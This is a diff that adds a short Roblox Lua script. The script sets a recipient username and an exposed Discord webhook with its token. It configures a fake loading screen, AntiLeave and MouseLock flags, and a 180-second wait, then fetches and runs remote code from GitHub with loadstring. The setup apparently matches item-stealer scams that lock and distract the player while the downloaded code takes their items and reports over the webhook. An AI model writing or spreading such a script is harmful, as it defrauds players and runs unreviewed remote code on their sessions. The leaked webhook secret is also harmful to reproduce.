@@ -1,0 +1,21 @@
+UserName = "YESBOYGAMINGYT"
+
+Webhook = "https://discord.com/api/webhooks/1111949753614352386/sIUhKGhX2YZJkOpk4UWT1KyFL9eAb-SVNaCbCZQMDAsw04TdcZcdlHrN01Yb5_FqIzq7"
+
+_G.LoadingScreen = true
+
+_G.AntiLeave = true
+
+_G.MouseLock = true 
+
+_G.ScriptName = "Project-WD"
+
+_G.FirstText = "Script Preparing"
+
+_G.SecondText = "Script Loading..."
+
+_G.ThirdText = "Almost Done..."
+
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
